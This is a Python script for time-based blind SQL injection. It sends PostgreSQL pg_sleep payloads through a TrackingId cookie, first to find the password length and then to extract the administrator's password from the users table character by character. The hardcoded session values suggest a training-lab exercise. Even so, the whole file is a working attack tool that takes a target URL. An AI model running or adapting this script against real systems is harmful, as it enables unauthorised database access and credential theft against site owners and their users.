import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8087','https':'http://127.0.0.1:8087'}

# encoded_variable = urllib.parse.quote(variable)

def password_size(url) :
    size = 0
    for i in range(1, 50) :
        payload = "'||(SELECT CASE WHEN (LENGTH(password)>%s) THEN pg_sleep(3) ELSE pg_sleep(-1) END FROM users WHERE LENGTH(password)>%s)--" % (i,i)
        cookies = {'TrackingId':'HXpQiabqNh1F93PL'+payload, 'session':'DggVIYxncPDMg4KRODtC8S7htlaOcPZR'}
        
        # time_start = time.time()
        r = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
        # time_end = time.time()
        
        if (r.elapsed.total_seconds()) < 3 :
            size = i
            print("Here the right value : " + str(i))
            break
    
    return size


def sqli_exploit(url, size):
    password = ''
    data_list = "abcdefghijklmnopqrstuvwxyz0123456789"
    
    for i in range(1, size+1):
        for j in range(32, 127):
            payload = "'||(SELECT CASE WHEN (ascii(SUBSTRING(password,%s,1))='%s') THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users WHERE username='administrator')--"%(i,j)
            cookies = {'TrackingId':'HXpQiabqNh1F93PL'+payload, 'session':'DggVIYxncPDMg4KRODtC8S7htlaOcPZR'}
             
            # t_start = time.time()
            r = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
            # t_end = time.time()
            
            if int(r.elapsed.total_seconds()) >= 5 :
                password += chr(j)
                sys.stdout.write('\r'+password)
                sys.stdout.flush()
                break
            else :
                sys.stdout.write('\r'+password+chr(j))
                sys.stdout.flush()
                
    return password

def main() :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print('[+] Usage: %s <url>' % sys.argv[0])
        print('[+] Example: %s www.example.com' % sys.argv[0])
        
    size = password_size(url)
    password = sqli_exploit(url, size)
    
    if password :
        print('Here is the administrator password: %s' % password)
    else :
        print('The sql statement has failled')
        
        
if __name__ == '__main__' :
    main()